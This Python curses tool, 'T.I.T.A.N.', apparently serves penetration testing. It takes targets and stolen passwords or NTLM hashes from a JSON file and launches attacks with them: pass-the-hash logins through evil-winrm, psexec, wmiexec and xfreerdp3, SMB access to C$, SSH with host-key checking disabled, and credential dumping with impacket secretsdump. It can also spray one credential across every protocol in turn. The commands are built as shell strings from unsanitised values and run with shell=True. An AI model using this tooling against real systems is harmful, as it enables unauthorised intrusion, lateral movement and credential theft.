import json
import os
import subprocess
import sys
import curses
from datetime import datetime

# --- CONFIGURATION ---
SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
CONFIG_FILE = os.path.join(SCRIPT_DIR, "targets.json")
LOG_FILE = os.path.join(SCRIPT_DIR, "titan_history.log")

def log_action(target, user, tool, status):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] {status.upper()} | {tool} | {target} | {user}\n"
    try:
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
    except:
        pass

def load_config():
    if not os.path.exists(CONFIG_FILE): return {}
    try:
        with open(CONFIG_FILE, "r") as f: return json.load(f)
    except: return {}

def get_cmd(tool, target_ip, user, secret, c_type, testing=False):
    impacket_secret = f"aad3b435b51404eeaad3b435b51404ee:{secret}" if c_type == "hash" else secret
    if tool == "Evil-WinRM":
        return f"evil-winrm -i {target_ip} -u '{user}' " + (f"-H {secret}" if c_type == "hash" else f"-p '{secret}'")
    elif tool == "SMBClient":
        cmd = f"smbclient //{target_ip}/C$ -U '{user}'" + (f" --pw-nt-hash {secret}" if c_type == "hash" else f"%'{secret}'")
        return cmd + " -c 'ls'" if testing else cmd
    elif tool == "SSH":
        if c_type == "hash":
            return "echo 'SSH requires a plaintext password' >&2; exit 1"
        cmd = f"sshpass -p '{secret}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 '{user}'@{target_ip}"
        return cmd + " 'whoami'" if testing else cmd
    elif tool == "SecretsDump":
        return f"impacket-secretsdump '{user}'" + (f" -hashes {impacket_secret}" if c_type == "hash" else f":'{secret}'") + f"@{target_ip}"
    elif tool == "Psexec":
        cmd = f"impacket-psexec '{user}'" + (f" -hashes {impacket_secret}" if c_type == "hash" else f":'{secret}'") + f"@{target_ip}"
        return cmd + " -c 'whoami'" if testing else cmd
    elif tool == "WMIExec":
        cmd = f"impacket-wmiexec '{user}'" + (f" -hashes {impacket_secret}" if c_type == "hash" else f":'{secret}'") + f"@{target_ip}"
        return cmd + " 'whoami'" if testing else cmd
    elif tool == "XFreeRDP3":
        cmd = f"xfreerdp3 /v:{target_ip} /u:'{user}' " + (f"/pth:{secret}" if c_type == "hash" else f"/p:'{secret}'") + " /cert:ignore"
        return cmd + " +auth-only" if testing else cmd + " /dynamic-resolution"
    return ""

def test_tool(tool, target_ip, user, secret, c_type):
    fail_keywords = ["failed", "error", "denied", "not known", "invalid", "connection refused", "could not"]
    cmd = get_cmd(tool, target_ip, user, secret, c_type, testing=True)
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=12)
        output = (result.stdout + result.stderr).lower()
        if result.returncode != 0 or any(kw in output for kw in fail_keywords):
            log_action(target_ip, user, tool, "AUDIT_FAIL")
            return False
        log_action(target_ip, user, tool, "AUDIT_SUCCESS")
        return True
    except:
        return False

def draw_menu(stdscr, title, subtitle, options, current_row):
    stdscr.clear()
    h, w = stdscr.getmaxyx()
    
    # Header
    stdscr.attron(curses.color_pair(1))
    stdscr.addstr(1, 2, title, curses.A_BOLD)
    stdscr.attroff(curses.color_pair(1))
    stdscr.addstr(2, 2, subtitle)
    
    for idx, row in enumerate(options):
        x = 4
        y = 4 + idx
        if idx == current_row:
            stdscr.attron(curses.color_pair(2))
            stdscr.addstr(y, x, f" > {row} ")
            stdscr.attroff(curses.color_pair(2))
        else:
            stdscr.addstr(y, x, f"   {row}")
    
    stdscr.addstr(h-2, 2, "[Arrows] Move | [Enter] Select | [Q] Exit")
    stdscr.refresh()

def run_titan(stdscr):
    curses.curs_set(0)
    curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_BLACK, curses.COLOR_CYAN)
    
    while True:
        data = load_config()
        if not data:
            stdscr.addstr(5, 2, "No targets in targets.json. Add via GUI.", curses.color_pair(1))
            stdscr.getch()
            return

        # --- 1. Target Selection ---
        targets = list(data.keys())
        target_opts = [f"{t.ljust(15)} ({data[t].get('hostname', 'N/A')})" for t in targets]
        current_row = 0
        
        while True:
            draw_menu(stdscr, "T.I.T.A.N. CLI v1.3", "Taylor's Interactive Tool for Attack Navigation", target_opts, current_row)
            key = stdscr.getch()
            if key == curses.KEY_UP and current_row > 0: current_row -= 1
            elif key == curses.KEY_DOWN and current_row < len(target_opts)-1: current_row += 1
            elif key == ord('q') or key == ord('Q'): sys.exit()
            elif key == curses.KEY_ENTER or key in [10, 13]:
                target_ip = targets[current_row]
                break

        # --- 2. Credential Selection ---
        creds = data[target_ip]['creds']
        cred_opts = [f"{c['user'].ljust(12)} [{c['type']}] | {c.get('notes', '')}" for c in creds]
        cred_opts.append(".. Back")
        current_row = 0
        
        while True:
            draw_menu(stdscr, f"TARGET: {target_ip}", "Select credential for dispatch:", cred_opts, current_row)
            key = stdscr.getch()
            if key == curses.KEY_UP and current_row > 0: current_row -= 1
            elif key == curses.KEY_DOWN and current_row < len(cred_opts)-1: current_row += 1
            elif key == ord('q') or key == ord('Q'): sys.exit()
            elif key == curses.KEY_ENTER or key in [10, 13]:
                if current_row == len(cred_opts) - 1: # Back
                    break
                cred = creds[current_row]
                
                # --- 3. Action Selection ---
                actions = ["Launch Interactive Tool", "Audit All Protocols", ".. Back"]
                act_row = 0
                while True:
                    draw_menu(stdscr, f"CRED: {cred['user']}@{target_ip}", "Choose operation:", actions, act_row)
                    key_act = stdscr.getch()
                    if key_act == curses.KEY_UP and act_row > 0: act_row -= 1
                    elif key_act == curses.KEY_DOWN and act_row < len(actions)-1: act_row += 1
                    elif key_act == ord('q') or key_act == ord('Q'): sys.exit()
                    elif key_act == curses.KEY_ENTER or key_act in [10, 13]:
                        if act_row == 0: # Launch Tool
                            tools = ["Evil-WinRM", "SMBClient", "SSH", "SecretsDump", "Psexec", "WMIExec", "XFreeRDP3"]
                            t_row = 0
                            while True:
                                draw_menu(stdscr, "DISPATCHER", "Select tool to launch:", tools, t_row)
                                key_t = stdscr.getch()
                                if key_t == curses.KEY_UP and t_row > 0: t_row -= 1
                                elif key_t == curses.KEY_DOWN and t_row < len(tools)-1: t_row += 1
                                elif key_t == curses.KEY_ENTER or key_t in [10, 13]:
                                    selected_tool = tools[t_row]
                                    cmd = get_cmd(selected_tool, target_ip, cred['user'], cred['secret'], cred['type'])
                                    log_action(target_ip, cred['user'], selected_tool, "LAUNCHED")
                                    curses.endwin() # Suspends curses to show tool output
                                    print(f"\n[*] Taylor's T.I.T.A.N. Dispatching {selected_tool}...\n")
                                    subprocess.run(cmd, shell=True)
                                    input("\n[!] Session closed. Press Enter to return to T.I.T.A.N.")
                                    stdscr.clear()
                                    break
                            break # Back to Action
                        elif act_row == 1: # Audit
                            curses.endwin()
                            print(f"\n[*] Auditing all protocols for {cred['user']}...\n")
                            tools = ["Evil-WinRM", "SMBClient", "SSH", "SecretsDump", "Psexec", "WMIExec", "XFreeRDP3"]
                            for tool in tools:
                                print(f" Testing {tool.ljust(12)}: ", end="", flush=True)
                                if test_tool(tool, target_ip, cred['user'], cred['secret'], cred['type']):
                                    print("[ SUCCESS ]")
                                else: print("[ FAILED  ]")
                            input("\nPress Enter to return to T.I.T.A.N.")
                            break # Back to Action
                        elif act_row == 2: break # Back to Creds
                break # Exit Cred loop to refresh
            
if __name__ == "__main__":
    curses.wrapper(run_titan)
